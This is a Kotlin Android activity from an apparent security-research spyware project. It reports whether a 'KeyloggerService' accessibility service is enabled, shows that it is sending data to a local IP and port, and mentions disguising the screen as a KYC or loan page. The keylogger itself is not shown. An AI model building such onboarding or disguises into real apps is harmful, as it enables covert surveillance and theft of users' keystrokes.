package com.security.research.phonemonitor

import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.text.TextUtils
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity

/**
 * MainActivity.kt
 * ================
 * Minimal UI — just shows whether the Accessibility Service
 * is enabled and provides a button to open the settings page.
 *
 * In a real spyware APK this would be disguised as a "KYC Verification"
 * or "Loan Processing" screen. We keep it honest.
 */
class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        updateStatus()
    }

    override fun onResume() {
        super.onResume()
        updateStatus()
    }

    private fun updateStatus() {
        val statusText = findViewById<TextView>(R.id.statusText)
        val enableBtn  = findViewById<Button>(R.id.enableBtn)

        if (isAccessibilityEnabled()) {
            statusText.text = "✅ Service ACTIVE\nSending to 192.168.179.7:9999"
            enableBtn.text  = "Open Accessibility Settings"
        } else {
            statusText.text = "❌ Service NOT enabled\nTap button below to activate"
            enableBtn.text  = "Enable Accessibility Service"
        }

        enableBtn.setOnClickListener {
            // Opens Android Accessibility settings directly
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }
    }

    private fun isAccessibilityEnabled(): Boolean {
        val service = "$packageName/${KeyloggerService::class.java.canonicalName}"
        val enabled = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        return enabled.contains(service)
    }
}
